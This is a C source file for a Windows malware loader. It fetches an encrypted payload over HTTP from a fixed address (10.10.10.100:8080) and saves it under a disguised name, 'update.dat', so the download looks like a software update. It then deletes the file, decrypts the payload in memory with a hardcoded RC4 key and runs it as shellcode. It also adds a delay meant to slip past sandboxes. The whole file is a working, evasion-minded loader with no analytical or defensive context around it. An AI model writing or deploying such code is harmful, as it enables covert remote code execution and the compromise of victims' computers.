/*
 * Stageless Loader - Simple RC4 Encryption
 * Downloads encrypted payload from: http://10.10.10.100:8080/payload.enc
 * Decrypts with RC4 and executes
 */

#include <windows.h>
#include <urlmon.h>
#include <string.h>

#pragma comment(lib, "urlmon.lib")

// RC4 decryption key (from payload_keys.h)
static BYTE g_Rc4Key[32] = { 0xc7, 0xc7, 0x81, 0x54, 0xad, 0x0a, 0x56, 0x45, 0x37, 0x81, 0xe3, 0xe2, 0xa0, 0x85, 0x39, 0xc5, 0x64, 0xf2, 0x21, 0x42, 0xf9, 0xc2, 0x8d, 0x43, 0x1b, 0x05, 0x43, 0x21, 0x5c, 0x84, 0xc1, 0x83 };

// RC4 decryption
static void DecryptRC4(BYTE* data, DWORD len) {
    BYTE S[256];
    for (int i = 0; i < 256; i++) S[i] = i;

    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + g_Rc4Key[i % 32]) % 256;
        BYTE t = S[i]; S[i] = S[j]; S[j] = t;
    }

    int i = 0;
    j = 0;
    for (DWORD k = 0; k < len; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        BYTE t = S[i]; S[i] = S[j]; S[j] = t;
        data[k] ^= S[(S[i] + S[j]) % 256];
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Anti-sandbox: short delay
    Sleep(1000);

    // Download encrypted payload
    char url[] = "http://10.10.10.100:8080/payload.enc";
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    strcat(tempPath, "update.dat");

    // Download (looks like software update)
    HRESULT hr = URLDownloadToFileA(NULL, url, tempPath, 0, NULL);
    if (hr != S_OK) return 1;

    // Read downloaded file
    HANDLE hFile = CreateFileA(tempPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 1;

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* data = (BYTE*)VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
    if (!data) {
        CloseHandle(hFile);
        return 1;
    }

    DWORD bytesRead;
    ReadFile(hFile, data, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // Delete temp file
    DeleteFileA(tempPath);

    // Decrypt with RC4
    DecryptRC4(data, fileSize);

    // Make executable
    DWORD oldProtect;
    if (!VirtualProtect(data, fileSize, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFree(data, 0, MEM_RELEASE);
        return 1;
    }

    // Execute
    ((void(*)())data)();

    return 0;
}
